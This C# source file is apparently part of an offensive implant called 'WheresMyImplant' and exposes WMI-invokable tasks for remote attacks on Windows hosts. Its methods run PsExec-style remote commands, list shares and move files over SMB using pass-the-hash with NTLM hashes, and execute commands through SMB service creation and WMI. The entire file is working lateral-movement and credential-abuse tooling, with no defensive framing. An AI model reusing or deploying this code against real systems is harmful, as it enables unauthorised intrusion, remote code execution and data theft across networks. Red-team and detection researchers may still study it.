using System;
using System.Linq;
using System.Management.Instrumentation;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        public static void PSExecCommand(String system, String execute, String isCommand)
        {
            Boolean comspec;
            if (!Boolean.TryParse(isCommand, out comspec))
            {
                comspec = false;
            }

            using (PSExec psexec = new PSExec())
            {
                psexec.Connect(system);
                String command = execute;
                if (comspec)
                {
                    command = String.Format("%COMSPEC% /C start {0}", execute);
                }
                psexec.Create(command);
                psexec.Open();
                psexec.Start();
                psexec.Stop();
            }
        }

        [ManagementTask]
        public static String PTHSMBClientList(String uncPath, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            using (SMBClient smbClient = new SMBClient())
            {
                String target, share, folder = String.Empty;
                try
                {
                    System.Collections.IEnumerator enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    while (enumerator.MoveNext())
                    {
                        sbFolder.Append((String)enumerator.Current + @"\");
                    }
                    folder = sbFolder.ToString();
                }
                catch (Exception ex)
                {
                    return ex.ToString();
                }

                if (!smbClient.Connect(target))
                {
                    return "[-] Unable to Connect";
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    return "[-] Login Failed";
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
                    smbClient.CreateRequest(String.Empty);
                    smbClient.InfoRequest();
                    if (!String.IsNullOrEmpty(folder))
                    {
                        smbClient.CreateRequest(folder);
                        smbClient.CloseRequest();
                    }
                    smbClient.FindRequest(folder);
                    smbClient.ParseDirectoryContents();
                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    output.Append(ex.ToString());
                }
                finally
                {
                    output.Append(smbClient.GetOutput());
                }
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            using (SMBClientGet smbClient = new SMBClientGet())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathSource.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    return ex.ToString();
                }

                if (!smbClient.Connect(target))
                    return "[-] Unable to Connect";

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                    return "[-] Login Failed";

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
                    smbClient.CreateRequest(folder + file);
                    smbClient.CloseRequest();
                    smbClient.CreateRequest(folder);
                    smbClient.FindRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.ReadRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.InfoRequest();
                    smbClient.InfoRequest(destination);
                    smbClient.ReadRequest2();
                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    output.Append(ex.ToString());
                }
                finally
                {
                    output.Append(smbClient.GetOutput());
                }
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String PTHSMBClientPut(String source, String uncPathDestination, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            using (SMBClientPut smbClient = new SMBClientPut())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                        return "Invalid UNC Path";
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    return ex.ToString();
                }

                if (!smbClient.Connect(target))
                    return "[-] Unable to Connect";

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                    return "[-] Login Failed";

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(folder + file, 1);
                    smbClient.CreateRequest(folder + file, 2);

                    smbClient.GetInfoRequest();
                    smbClient.SetInfoRequest(source, folder + file);

                    smbClient.WriteRequest(source);

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    output.Append(ex.ToString());
                }
                finally
                {
                    output.Append(smbClient.GetOutput());
                }
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String PTHSMBExec(String target, String command, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                using (SMBExec smbExec = new SMBExec())
                {
                    smbExec.Connect(target);
                    smbExec.NegotiateSMB();
                    smbExec.NegotiateSMB2();
                    smbExec.NTLMSSPNegotiate();
                    if (smbExec.Authenticate(domain, username, hash))
                    {
                        try
                        {
                            smbExec.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                            smbExec.CreateRequest(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
                            smbExec.RPCBind();
                            smbExec.ReadRequest();
                            smbExec.OpenSCManagerW();
                            smbExec.ReadRequest();
                            smbExec.CheckAccess(command);
                            smbExec.ReadRequest();
                            smbExec.StartServiceW();
                            smbExec.ReadRequest();
                            smbExec.DeleteServiceW();
                            smbExec.ReadRequest();
                            smbExec.CloseServiceHandle();
                            smbExec.CloseRequest();
                            smbExec.DisconnectTree();
                            smbExec.Logoff();
                        }
                        catch (Exception ex)
                        {
                            output.Append(ex.ToString());
                        }
                        finally
                        {
                            output.Append(smbExec.GetOutput());
                        }
                    }
                    else
                    {
                        output.Append("[-] Login Failed");
                    }
                }
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String PTHWMIExec(String target, String command, String domain, String username, String hash)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                using (WMIExec wmiExec = new WMIExec(command))
                {
                    if (wmiExec.ConnectInitiator(target))
                    {
                        wmiExec.InitiateRPC();
                    }

                    if (wmiExec.ConnectWMI())
                    {
                        wmiExec.RPCBind();
                        wmiExec.Authenticate(domain, username, hash);
                        wmiExec.Activator();
                    }

                    if (wmiExec.ConnectRandom())
                    {
                        wmiExec.RPCBindRandom();
                        wmiExec.AuthenticateRandom(domain, username, hash);
                        wmiExec.QueryInterface();
                    }
                    output.Append(wmiExec.GetOutput());
                }
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            return output.ToString();
        }
    }
}